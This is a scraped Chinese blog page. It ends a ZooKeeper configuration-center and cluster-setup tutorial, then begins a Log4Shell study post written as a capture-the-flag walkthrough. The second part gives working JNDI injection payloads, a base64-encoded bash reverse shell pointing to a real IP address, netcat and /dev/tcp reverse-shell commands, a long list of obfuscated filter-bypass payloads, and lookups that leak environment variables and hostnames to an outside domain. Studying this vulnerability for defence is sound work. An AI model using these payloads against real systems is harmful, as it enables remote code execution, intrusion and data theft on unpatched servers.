import org.apache.zookeeper.Watcher.Event.KeeperState;
import org.apache.zookeeper.ZooKeeper;
import org.apache.zookeeper.data.Stat;
<p>/**</p>
<ul>
<li>分布式配置中心 demo</li>
<li>@author</li>
<li></li>
</ul>
<p>*/<br>
public class ZooKeeperProSync implements Watcher &#123;</p>
<pre><code>private static CountDownLatch connectedSemaphore = new CountDownLatch(1);
private static ZooKeeper zk = null;
private static Stat stat = new Stat();

public static void main(String[] args) throws Exception &#123;
    //zookeeper配置数据存放路径
    String path = &quot;/username&quot;;
    //连接zookeeper并且注册一个默认的监听器
    zk = new ZooKeeper(&quot;192.168.31.100:2181&quot;, 5000, //
            new ZooKeeperProSync());
    //等待zk连接成功的通知
    connectedSemaphore.await();
    //获取path目录节点的配置数据，并注册默认的监听器
    System.out.println(new String(zk.getData(path, true, stat)));

    Thread.sleep(Integer.MAX_VALUE);
&#125;

public void process(WatchedEvent event) &#123;
    if (KeeperState.SyncConnected == event.getState()) &#123;  //zk连接成功通知事件
        if (EventType.None == event.getType() &amp;amp;&amp;amp; null == event.getPath()) &#123;
            connectedSemaphore.countDown();
        &#125; else if (event.getType() == EventType.NodeDataChanged) &#123;  //zk目录节点数据变化通知事件
            try &#123;
                System.out.println(&quot;配置已修改，新值为：&quot; + new String(zk.getData(event.getPath(), true, stat)));
            &#125; catch (Exception e) &#123;
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>
<p>}</code></pre></p>
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">两个程序启动后都正确的读取到了zookeeper的/username目录节点下的数据'qingfeng'</p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">3、我们在zookeeper里修改下目录节点/username下的数据</p> 
 <img src="https://img-blog.csdn.net/20180712144020208?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""> 
 <br> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">修改完成后，我们看见两个程序后台都及时收到了他们监听的目录节点数据变更后的值，如下所示</span><br></span></span></span></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><img src="https://img-blog.csdn.net/20180712144042598?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br></span></span></span></span></span></p> 
 <p><span style="background-color:rgb(255,255,255);color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"></span></span></span></span></span></p> 
 <h1 id="h1_7" style="font-size:24px;font-family:'PingFang SC', 'Helvetica Neue', 'Microsoft YaHei UI', 'Microsoft YaHei', 'Noto Sans CJK SC', Sathu, EucrosiaUPC, Arial, Helvetica, sans-serif;line-height:1.28571em;font-weight:500;color:rgb(61,70,77);background-color:rgb(255,255,255);"><span style="font-weight:bolder;">Zookeeper集群模式安装</span></h1> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">本例搭建的是伪集群模式，即一台机器上启动三个zookeeper实例组成集群，真正的集群模式无非就是实例IP地址不同，搭建方法没有区别</p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="font-weight:bolder;">Step1</span>：配置JAVA环境，检验环境：java -version</p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="font-weight:bolder;">Step2</span>：下载并解压zookeeper</p> 
 <pre><code class="language-java"># cd /usr/local
# wget http://mirror.bit.edu.cn/apache/zookeeper/stable/zookeeper-3.4.12.tar.gz
# tar -zxvf zookeeper-3.4.12.tar.gz
# cd zookeeper-3.4.12</code></pre> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><strong>Step3</strong></span><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">：重命名 zoo_sample.cfg文件</span></p> 
 <pre><code class="language-java"># cp conf/zoo_sample.cfg conf/zoo-1.cfg</code></pre> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><strong>Step4</strong></span><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">：修改配置文件zoo-1.cfg，原配置文件里有的，修改成下面的值，没有的则加上</span></p> 
 <pre><code class="language-java"># vim conf/zoo-1.cfg
dataDir=/tmp/zookeeper-1
clientPort=2181
server.1=127.0.0.1:2888:3888
server.2=127.0.0.1:2889:3889
server.3=127.0.0.1:2890:3890</code></pre> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="font-weight:bolder;">配置说明</span></p> 
 <ul style="margin-left:30px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">
  <li>tickTime：这个时间是作为 Zookeeper 服务器之间或客户端与服务器之间维持心跳的时间间隔，也就是每个 tickTime 时间就会发送一个心跳。</li>
  <li>initLimit：这个配置项是用来配置 Zookeeper 接受客户端（这里所说的客户端不是用户连接 Zookeeper 服务器的客户端，而是 Zookeeper 服务器集群中连接到 Leader 的 Follower 服务器）初始化连接时最长能忍受多少个心跳时间间隔数。当已经超过 10个心跳的时间（也就是 tickTime）长度后 Zookeeper 服务器还没有收到客户端的返回信息，那么表明这个客户端连接失败。总的时间长度就是 10*2000=20 秒</li>
  <li>syncLimit：这个配置项标识 Leader 与 Follower 之间发送消息，请求和应答时间长度，最长不能超过多少个 tickTime 的时间长度，总的时间长度就是 5*2000=10秒</li>
  <li>dataDir：顾名思义就是 Zookeeper 保存数据的目录，默认情况下，Zookeeper 将写数据的日志文件也保存在这个目录里。</li>
  <li>clientPort：这个端口就是客户端连接 Zookeeper 服务器的端口，Zookeeper 会监听这个端口，接受客户端的访问请求。</li>
  <li>server.A=B：C：D：其中 A 是一个数字，表示这个是第几号服务器；B 是这个服务器的 ip 地址；C 表示的是这个服务器与集群中的 Leader 服务器交换信息的端口；D 表示的是万一集群中的 Leader 服务器挂了，需要一个端口来重新进行选举，选出一个新的 Leader，而这个端口就是用来执行选举时服务器相互通信的端口。如果是伪集群的配置方式，由于 B 都是一样，所以不同的 Zookeeper 实例通信端口号不能一样，所以要给它们分配不同的端口号。</li>
 </ul> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="font-weight:bolder;">Step4</span>：再从zoo-1.cfg复制两个配置文件zoo-2.cfg和zoo-3.cfg，只需修改dataDir和clientPort不同即可</p> 
 <pre><code class="language-java"># cp conf/zoo-1.cfg conf/zoo-2.cfg
# cp conf/zoo-1.cfg conf/zoo-3.cfg
# vim conf/zoo-2.cfg
dataDir=/tmp/zookeeper-2
clientPort=2182
# vim conf/zoo-2.cfg
dataDir=/tmp/zookeeper-3
clientPort=2183</code></pre> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><span style="font-weight:bolder;">Step5</span>：标识Server ID</p> 
 <p style="line-height:28px;color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">创建三个文件夹/tmp/zookeeper-1，/tmp/zookeeper-2，/tmp/zookeeper-2，在每个目录中创建文件myid 文件，写入当前实例的server id，即1.2.3</p> 
 <pre><code class="language-java"># cd /tmp/zookeeper-1
# vim myid
1
# cd /tmp/zookeeper-2
# vim myid
2
# cd /tmp/zookeeper-3
# vim myid
3</code></pre> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><strong>Step6</strong></span><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">：启动三个zookeeper实例</span></p> 
 <pre><code class="language-java"># bin/zkServer.sh start conf/zoo-1.cfg
# bin/zkServer.sh start conf/zoo-2.cfg
# bin/zkServer.sh start conf/zoo-3.cfg</code></pre> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><strong>Step7</strong></span><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);">：检测集群状态，也可以直接用命令“zkCli.sh -server IP:PORT”连接zookeeper服务端检测</span></p> 
 <p><span style="color:rgb(61,70,77);font-family:'Pingfang SC', STHeiti, 'Lantinghei SC', 'Open Sans', Arial, 'Hiragino Sans GB', 'Microsoft YaHei', 'WenQuanYi Micro Hei', SimSun, sans-serif;background-color:rgb(255,255,255);"><img src="https://img-blog.csdn.net/20180712144336907?watermark/2/text/aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFfNjY2NjY=/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70" alt=""><br></span></p> 
 <p>至此，我们对zookeeper就算有了一个入门的了解，当然zookeeper远比我们这里描述的功能多，比如用zookeeper实现集群管理，分布式锁，分布式队列，zookeeper集群leader选举等等<br></p> 
 <p>推荐阅读：<a target="_blank" rel="noopener" href="https://www.roncoo.com/course/view/255bac222b1b4300b42838b58fea3a2e">https://www.roncoo.com/course/view/255bac222b1b4300b42838b58fea3a2e</a></p> 
 <p>文章来源：https://my.oschina.net/u/3796575/blog/1845035</p> 
</div>
## 关于我
<p>Brath 是一个热爱技术的 Java 程序猿，公众号「InterviewCoder」定期分享有趣有料的精品原创文章！</p>
<p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E4%BA%8C%E7%BB%B4%E7%A0%81plus.png" alt="InterviewCoder"></p>
<p>非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！</p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-04-27T09:20:48.000Z" title="2023/4/27 17:20:48">2023-04-27</time>发表</span><span class="level-item"><time dateTime="2023-04-27T09:22:32.311Z" title="2023/4/27 17:22:32">2023-04-27</time>更新</span><span class="level-item">24 分钟读完 (大约3637个字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/04/27/%E3%80%90Log4J%E3%80%91JAVA%E5%AE%89%E5%85%A8--log4j%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6%E5%88%86%E6%9E%90/">【Log4J】JAVA安全--log4j漏洞研究分析</a></p><div class="content"><p><img src="https://brath4.oss-cn-shenzhen.aliyuncs.com/picgo/%E6%89%AB%E7%A0%81_%E6%90%9C%E7%B4%A2%E8%81%94%E5%90%88%E4%BC%A0%E6%92%AD%E6%A0%B7%E5%BC%8F-%E6%A0%87%E5%87%86%E8%89%B2%E7%89%88.png" alt="InterviewCoder"></p>
<h2 id="log4jjava安全log4j漏洞研究分析"><a class="markdownIt-Anchor" href="#log4jjava安全log4j漏洞研究分析">#</a> 【Log4J】JAVA 安全–log4j 漏洞研究分析</h2>
<div id="content_views" class="markdown_views prism-atom-one-light"> 
 <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path> 
 </svg> 
 <p>前言：这个漏洞很火，但是自己一直没咋研究过 算是抽空跟了下，总结了很多师傅的文章 写这篇文章进行记录下自己的学习过程吧</p> 
 <h1><a id="log4j_1"></a>log4j漏洞复现</h1> 
 <h2><a id="_2"></a><mark>本地复现</mark></h2> 
 <p>这个很多人写了 可直接参考这个<br> https://cloud.tencent.com/developer/article/1917856</p> 
 <pre><code class="prism language-bash"><span class="token function">import</span> org.apache.logging.log4j.Logger<span class="token punctuation">;</span>
<span class="token function">import</span> org.apache.logging.log4j.LogManager<span class="token punctuation">;</span>
<p>public class log4jRCE <span class="token punctuation">&#123;<!-- --></span><br>
private static final Logger logger <span class="token operator">=</span> LogManager.getLogger<span class="token punctuation">(</span>log4jRCE.class<span class="token punctuation">)</span><span class="token punctuation">;</span><br>
public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;<!-- --></span><br>
logger.error<span class="token punctuation">(</span><span class="token string">&quot;<span class="token variable">$&#123;jndi:ldap:// 服务器的地址 / TomcatBypass/Command/Base64/Y2FsYw==&#125;</span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><br>
<span class="token punctuation">&#125;</span><br>
<span class="token punctuation">&#125;</span></p>
<p></code></pre></p>
 <p>这篇文章里面还缺了一点东西<br> 就是idea生成jar文件的方法<br> 这里一起写出来<br> ①打开模块设置<br> <img src="https://img-blog.csdnimg.cn/d8ebe78065f64a89bc310583697bb07a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ②选模块<br> <img src="https://img-blog.csdnimg.cn/c80ad1af9e7d41e080646823d703c488.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <p>③选好主类以及生成的文件在哪些地方<br> <img src="https://img-blog.csdnimg.cn/d4d877b6969643438f51f2f9019bd2bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> ④选择包含在项目构建中然后点击应用<br> <img src="https://img-blog.csdnimg.cn/95acb2cb63304dea8d51d75dd29c7414.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 编译生成即可<br> <img src="https://img-blog.csdnimg.cn/08fd4bd415414dca979f9b7349771ecb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_11,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 但是对于这个我是失败了的 不知道啥原因<img src="https://img-blog.csdnimg.cn/6c0a5d8594a745e4abd1c0213d119391.png" alt="在这里插入图片描述"></p> 
 <p>本地编写jar方法</p> 
 <pre><code class="prism language-bash">①把java编写为class文件
javac  Exploit.java
②把class编写为jar文件
java -jar Exploit.jar Exploit.class
</code></pre> 
 <h2><a id="_44"></a><mark>在线靶场复现</mark></h2> 
 <p>这里以bugku上的靶场为例进行复现<br> https://ctf.bugku.com/challenges/detail/id/340.html<br> <img src="https://img-blog.csdnimg.cn/76c81b1f01f04623b82176d1a99f74f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 环境配置<br> ①ldap服务<br> <img src="https://img-blog.csdnimg.cn/0fd91a1552324f52a3abf5f82f7668b6.png" alt="在这里插入图片描述"></p> 
 <p>服务器起一个ldap服务就好了<br> java -jar JNDIExploit-1.3-SNAPSHOT.jar -i 服务器的地址<br> <img src="https://img-blog.csdnimg.cn/a34a810cfebc4625992a4661a949141b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 直接执行反弹shell<br> 即直接配置bash反弹shell命令</p> 
 <pre><code class="prism language-bash">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span class="token string">"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84Mi4xNTYuMjI2LjY3Lzk5OTkgMD4mMQ&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span> -A <span class="token string">"192.168.72.1"</span>
</code></pre> 
 <p>②nc配置（windows的话）<br> 起到获取flag的思路<br> https://eternallybored.org/misc/netcat/<br> 下载好后进行监听即可<br> nc -lvnp 端口<br> <img src="https://img-blog.csdnimg.cn/b88daebcb458429a9eee3e329d0f595c.png" alt="在这里插入图片描述"></p> 
 <p>思路1<br> 不反弹shell进行获取flag</p> 
 <pre><code class="prism language-bash">user<span class="token operator">=</span><span class="token variable">$&#123;jndi:ldap://服务器的ip:1389/TomcatBypass/TomcatEcho&#125;</span><span class="token operator">&amp;</span>pwd<span class="token operator">=</span>69be4a983341add38e2ad1e5c804568a
</code></pre> 
 <p><img src="https://img-blog.csdnimg.cn/b5df419f4de342d880d643a16afda976.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/444bc67397494e49b4bdd68a7ecf7595.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> 思路2<br> 进行反弹shell获取</p> 
 <pre><code class="prism language-bash">常见反弹shell的思路
①nc ip 12345 -e /bin/sh
<p>②bash -i <span class="token operator">&gt;</span><span class="token operator">&amp;</span> /dev/tcp/ 启动 nc 服务器的 ip/9999 0<span class="token operator">&gt;</span><span class="token operator">&amp;</span>1<br>
<span class="token comment">#然后先 base64 编码然后对编码后的特殊字符进行 2 层 url 转码</span></p>
<p>这台要用第一个命令，题目限定了<br>
 payload<span class="token operator">=</span><span class="token variable">$&#123;jndi:ldap:1 / 服务器 ip:1389/basic/Command/Base64 / 二层转码之后的字符&#125;</span></p>
<p></code></pre></p>
 <p>反弹shell后执行即可</p> 
 <p><img src="https://img-blog.csdnimg.cn/e08749697c9b4afa8bf3e14c080d64a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/ae8c7c82b468476a94e481ff0eba637a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/435deaf0004c4ae5b7c83372964c06fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAZ29kZGVtb24=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p> 
 <h1><a id="_103"></a><mark>知识点分析</mark></h1> 
 <p>受影响版本<br> Apache log4j 2.0-beta9 ≤ 2.14.1<br> 组件<br> org.apache.logging.log4j，且版本号小于2.15.0-rc2</p> 
 <p>ldap基础知识以及服务原因</p> 
 <h2><a id="payload_111"></a><mark>payload总结</mark></h2> 
 <p>参考知识点：来源团队的雪晴师傅的<br> https://www.yuque.com/yq1ng/java/pbica2#xrVeI<br> 基础payload<br> ${jndi:ldap://t00ls.com/poc<br> 绕过的一些payload</p> 
 <pre><code class="prism language-bash"><span class="token variable">$&#123;jndi:ldap://domain.com/j&#125;</span>
<span class="token variable">$&#123;jndi:ldap:/domain.com/a&#125;</span>
<span class="token variable">$&#123;jndi:dns:/domain.com&#125;</span>
<span class="token variable">$&#123;jndi:dns://domain.com/j&#125;</span>
<span class="token variable">$&#123;$&#123;::-j&#125;</span><span class="token variable">$&#123;::-n&#125;</span><span class="token variable">$&#123;::-d&#125;</span><span class="token variable">$&#123;::-i&#125;</span><span class="token keyword">:</span><span class="token variable">$&#123;::-r&#125;</span><span class="token variable">$&#123;::-m&#125;</span><span class="token variable">$&#123;::-i&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;$&#123;::-j&#125;</span>ndi:rmi://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:rmi://domainldap.com/j&#125;</span>
<span class="token variable">$&#123;$&#123;lower:jndi&#125;</span><span class="token keyword">:</span><span class="token variable">$&#123;lower:rmi&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;$&#123;lower:$&#123;lower:jndi&#125;</span><span class="token punctuation">&#125;</span>:<span class="token variable">$&#123;lower:rmi&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;$&#123;lower:j&#125;</span><span class="token variable">$&#123;lower:n&#125;</span><span class="token variable">$&#123;lower:d&#125;</span>i:<span class="token variable">$&#123;lower:rmi&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;$&#123;lower:j&#125;</span><span class="token variable">$&#123;upper:n&#125;</span><span class="token variable">$&#123;lower:d&#125;</span><span class="token variable">$&#123;upper:i&#125;</span><span class="token keyword">:</span><span class="token variable">$&#123;lower:r&#125;</span>m<span class="token variable">$&#123;lower:i&#125;</span><span class="token punctuation">&#125;</span>://domain.com/j<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:$&#123;lower:l&#125;</span><span class="token variable">$&#123;lower:d&#125;</span>a<span class="token variable">$&#123;lower:p&#125;</span>://domain.com<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;$&#123;env:NaN:-j&#125;</span>ndi<span class="token variable">$&#123;env:NaN:-:&#125;</span><span class="token variable">$&#123;env:NaN:-l&#125;</span>dap<span class="token variable">$&#123;env:NaN:-:&#125;</span>//domain.com/a<span class="token punctuation">&#125;</span>
jn<span class="token variable">$&#123;env::-&#125;</span>di:
jn<span class="token variable">$&#123;date:&#125;</span>di$<span class="token punctuation">&#123;<!-- --></span>date:<span class="token string">':'</span><span class="token punctuation">&#125;</span>
j<span class="token variable">$&#123;k8s:k5:-ND&#125;</span>i<span class="token variable">$&#123;sd:k5:-:&#125;</span>
j<span class="token variable">$&#123;main:\k5:-Nd&#125;</span>i<span class="token variable">$&#123;spring:k5:-:&#125;</span>
j<span class="token variable">$&#123;sys:k5:-nD&#125;</span><span class="token variable">$&#123;lower:i$&#123;web:k5:-:&#125;</span><span class="token punctuation">&#125;</span>
j<span class="token variable">$&#123;::-nD&#125;</span>i<span class="token variable">$&#123;::-:&#125;</span>
j<span class="token variable">$&#123;EnV:K5:-nD&#125;</span>i:
j<span class="token variable">$&#123;loWer:Nd&#125;</span>i<span class="token variable">$&#123;uPper::&#125;</span>
<p></code></pre></p>
 <p>信息泄露(主要是针对不出网的)</p> 
 <pre><code class="prism language-bash"><span class="token variable">$&#123;jndi:ldap://$&#123;env:user&#125;</span>.domain.com/exp<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:dns://$&#123;hostName&#125;</span>.domain.com/a<span class="token punctuation">&#125;</span>
<span class="token variable">$&#123;jndi:dns://$&#123;env:COMPUTERNAME&#125;</span>.domain.com/a<span class="token punctuation">&#125;</span>
